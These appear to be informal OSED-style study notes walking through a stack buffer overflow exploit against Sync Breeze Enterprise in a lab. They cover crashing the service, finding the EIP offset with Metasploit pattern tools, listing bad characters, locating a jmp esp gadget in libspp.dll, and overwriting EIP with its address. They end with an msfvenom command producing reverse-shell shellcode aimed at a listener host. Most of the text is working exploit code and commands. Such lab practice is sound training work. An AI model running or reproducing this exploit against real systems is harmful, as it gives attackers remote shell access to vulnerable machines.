try jeeves, buff, safe, chatter for more practice. anyways. 
first, crash with this app. 
```
/Documents/osed$ python3 syncbreeze.py 10.5.5.183
Sending evil buffer...
Done!
```
creating a pattern:
```
/home/nathan/metasploit-framework/tools/exploit/pattern_create.rb -l 800
```
now put  that pattern into ur crash app. 
attach debugger to process, hit g. then crash it. 

then take value in eip and find exact offset. 
```
/home/nathan/metasploit-framework/tools/exploit/pattern_offset.rb -l 800 -q 42306142
[*] Exact match at offset 780
```
we know that exactly at 780, the eip register starts. lets crash by spaming 780 a's then put something in eip. 
then we can put our shellcode on the stack (DEP would stop this) but first figure out if we can use enough space. 
```
filler = b"A" * 780
eip = b"B" * 4
offset = b"C" * 4
shellcode = b"D" * (1500 - len(filler) - len(eip) - len(offset))
inputBuffer = filler + eip + offset + shellcode
```
now check for bad characters.  (00, 0a, 09, 0D, 25, 26, 2B, 3D are removed)
switch to pyenv local 2.7.18, now python uses python2 in this dir. 
```
badchars = bytearray(
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0e\x0f\x10"
    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    b"\x21\x22\x23\x24\x27\x28\x29\x2a\x2c\x2d\x2e\x2f\x30"
    b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    )
```
now back at the debugger, we check to see if the chars appear. they do. 
```
db esp -10 L200
```
to check for aslr:
```
dt ntdll!_IMAGE_DOS_HEADER 0x00400000
<SNIP>
+0x03c e_lfanew         : 0n232
```
this contains the offset to our pe header. convert that and nt headers?
```
0:013> ? 0n232
Evaluate expression: 232 = 000000e8
0:013> dt ntdll!_IMAGE_NT_HEADERS 0x00400000+0xe8
   +0x000 Signature        : 0x4550
   +0x004 FileHeader       : _IMAGE_FILE_HEADER
   +0x018 OptionalHeader   : _IMAGE_OPTIONAL_HEADER
```
now, at offset 18 (optionalheader) is the structuer that holds these characterisics. view it with this. 
```
0:013> dt ntdll!_IMAGE_OPTIONAL_HEADER 0x00400000+0xe8+0x018
<SNIP>
DllCharacteristics : 0 = nothing.
```
as a much much easier method of testing, simply open process hacker write click properties the process. mitigation policies will show here. 

go to modules and click on dlls until you find one with only executable on it. 

then find the peice of memory we need from it. 
```
/home/nathan/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp esp
00000000  FFE4              jmp esp
```
then, we search for that command. 
```
lm m libspp
Browse full module list
start    end        module name
00940000 00b63000   libspp   C (export symbols)       C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
0:013> s -b 00940000 -e 00b63000 0xff 0xe4
009d0c83  ff e4 0b 9d 00 02 0c 9d-00 24 0c 9d 00 46 0c 9d  .........$...F..
```
now we can change our code to jump to it! little endian though, go backwards. 
```
 eip = b"\x83\x0c\x9d\x00" #009d0c83 lil e
```
then set a breakpoint at that address and press go. 
```
bp 009d0c83
```
now if it breaks, we have control, and were jumping there correctly. now generate shellcode. 
```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.5.5.10 LPORT=4444 EXITFUNC=thread -f c  -e x86/shikata_ga_nai -b "\x00\x09\x0a\x0d\x25\x26\x2b\x3d"
```
check the final poc. remember that the lib address is determined at runtime. 
